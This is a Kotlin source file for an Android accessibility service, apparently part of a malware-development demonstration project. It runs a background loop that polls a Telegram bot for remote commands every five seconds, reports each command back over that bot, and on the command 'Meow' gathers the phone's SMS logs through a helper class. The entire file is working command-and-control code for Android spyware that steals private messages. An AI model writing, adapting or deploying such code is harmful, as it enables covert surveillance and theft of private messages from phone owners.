package cocomelonc.hack.services

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import cocomelonc.hack.tools.HackNetwork
import cocomelonc.hack.tools.HackSmsLogs
import kotlinx.coroutines.*

class HackTelegramAccessibilityService : AccessibilityService() {

    private var lastUpdateId = 0
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    companion object {
        private const val TAG = "HackTelegramAccessibilityService"
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "accessibility service connected")

        serviceScope.launch {
            listenToTelegram()
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // not used
    }

    override fun onInterrupt() {
        Log.d(TAG, "accessibility service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }

    private suspend fun listenToTelegram() {
        val network = HackNetwork(applicationContext)
        while (isActive) {
            try {
                val updatesResponse = network.getUpdates(lastUpdateId)
                val updates = updatesResponse?.updates()
                if (!updates.isNullOrEmpty()) {
                    for (update in updates) {
                        val message = update.message()?.text()
                        message?.let {
                            Log.d(TAG, "received: $it")
                            network.sendTextMessage("new command: $it")
                            processCommand(it)
                            lastUpdateId = update.updateId() + 1
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "error: ${e.message}")
            }
            delay(5000)
        }
    }

    private fun processCommand(command: String) {
        if (command.contains("Meow", ignoreCase = true)) {
            HackSmsLogs(applicationContext).getSmsLogs()
        } else {
            HackNetwork(applicationContext).sendTextMessage("Unknown command: $command")
        }
    }
}
